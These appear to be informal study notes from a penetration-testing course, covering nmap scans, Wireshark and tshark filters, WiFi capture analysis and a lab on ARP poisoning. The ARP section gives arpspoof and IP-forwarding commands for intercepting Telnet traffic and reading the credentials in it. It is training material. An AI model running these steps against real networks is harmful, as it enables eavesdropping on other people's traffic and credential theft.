  

  

### **Network-Based Attacks - Part 1**

> Network Services ⇒ ARP , DHCP , SMB , FTP , TELNET , SSH

> Man in the Middle ⇒ where we have a two system that take to each other on the network , so on the Man in the middle attack we will be able to hear their traffic , so when the network traffic sent from the device 1 , so it’s sent to an endpoint ( Electrical signals ) , so depending on how the network set up , the traffic might hit all the Points on the network , related to the switch u don’t have this issues , ( on the past with hub , u can easily listen to everyone traffic) , so now if u want to listen to the traffic on your machine u ==need to connect to a SPAN port Which listen to all traffic on the switch== , or u need to ==**_Poison_**==

- **Network-Based Attacks - Part 1**
    
    1. first do nmap on your network ⇒ `nmap <ip>/24`
    2. now after we identify the subnet mask for it we will do a basic nmap ⇒ `namp <ip> -A`
    3. now we can follow the Packets ⇒ `opne wireshark` && `select eth 1` && `click on the blue button on the up` ⇒ to see all the packets and if u have a http packet was sent
    4. and everyone know the best feature ⇒ `PROTOCOL HIERARCHY`
    5. and ⇒ `Stattisitic` && `Conversations` ⇒ to see who is talked to who and like this
    6. and form the `view tab` u can `select the time` u want to display with it
    
- **Network-Based Attacks - Part 2**
    
    - `Follow Tcp or Http` .. etc
    - `Apply as a filter`
    

  

### **Network-Based Attacks Labs**

### ==**_Tshark_**==

- `tshark - v` ⇒ to see the version of tshark
- `tshark -D` ⇒ to see what interface we have ( eth0 , eth1)
- `tshark -i` <interface u want > ⇒ to dump packets from interface
- `tshark -r <pcap file >` ⇒ to dump the PCAP file
- `tshark -r <pcap file > -z io,phs -q` ⇒ to see the protocol HIERARCHY
- `tshark -r <PCAP file >` `-Y` `‘http’` ⇒ to make a filter just for http
- `tshark -r <PCAP file >` `-Y` `‘http’` `-Tfields -e` `frame.time` ⇒ to display the time then
- `tshark -r <PCAP file >` `-Y` `‘http contains password’` ⇒ to look just for packet that have a password on it

> u can put and filter on the - Y ‘ ‘

  

### ==**_ARP Poisoning_**==

1. `namp < ip> -sV -A` ⇒ to scan the target ip
2. so if we have a Telnet open
3. now open `Wireshark` and `intercept the Ping command`
4. `echo 1 > /proc/sys/net/ipv4/ip_forward` ⇒ Configure the Kali instance to forward IP packets
5. `arpspoof -i <interface>(eth1) -t <ip>(10.10.10.37) -r <ip but -1>(10.10.10.36)` ⇒ to do some arp spoofing

> so here we told 36 that we are 37 , so send to us all traffic of 36 :)

1. so now back to wireshark and dig on the TELNET traffic
2. we will see all data sent by telnet , like username , password ..etc

  

  

### ==**_WiFi Traffic Analysis_**==

1. After u intercept the traffic of the Wifi and save it in a PCAP file , Open this file Using Wireshark
2. `wlan contains <what u want>` ⇒ to search for text on any packet
3. now if he ask for any SSID related to any packet , u can search for it
4. u can find the number of operation the SSID WORK WITH using ⇒ `radio info ( on the packet info on botton of all packets )`
5. security mechanism is configured for SSID have 3 types ⇒ `OPEN`, `WPA-PSK`, `WPA2-PSK`
6. Is WiFi Protected Setup (WPS) enabled on SSID ⇒ u can check `the vendor info on Tagged parameter`
7. What is the total count of packets which were either transmitted or received by the device with MAC …. ⇒ `wlan.ta== <transmited> || wlan.ra==<recive>`
8. U can find the mac addr on ⇒ `Frame Control && source add`
9. `wlan.bssid == <bssid >` ⇒ to filter based on bssid
10. `wlan.addr == < mac addr>` ⇒ to filter using mac add
11. u can find TSF timestamb on ⇒ `Radio info`